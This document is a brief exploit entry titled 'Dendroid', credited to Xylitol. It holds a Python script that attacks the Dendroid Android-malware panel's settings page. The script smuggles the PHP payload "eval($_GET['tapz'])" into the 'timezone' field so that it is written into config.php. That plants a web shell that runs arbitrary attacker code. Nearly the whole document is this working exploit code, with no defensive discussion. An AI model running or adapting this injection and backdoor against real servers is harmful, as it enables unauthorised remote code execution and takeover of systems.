#### Dendroid


Type: Remote Code Execution

Author: [Xylitol](https://twitter.com/Xylit0l)

```
import requests

# Add URL
# Set a PHP payload
# Go to http://website/config.php

URL     = 'http://localhost/Panel/applysettings.php'
PAYLOAD = "(isset($_GET['tapz'])) ? eval($_GET['tapz']) : '"

data = {
        'dbhost'           : 'localhost',
        'dbname'           : 'dendroid',
        'dbusername'       : 'root',
        'dbpassword'       : '',
        'username'         : 'admin',
        'password'         : 'admin',
        'postboxsize'      : '10',
        'devicetablerefr'  : '10000',
        'filetablerefr'    : '10000',
        'historyboxrefr'   : '5000',
        'botoffline'       : '60',
        'timezone'         : "Europe/Brussels';" + PAYLOAD,
        'messageboxscroll' : 'Yes',
}
headers = { 'Host': '127.0.0.1' }
req     = requests.post(URL, data=data, headers=headers)

print 'HACKED!'
```
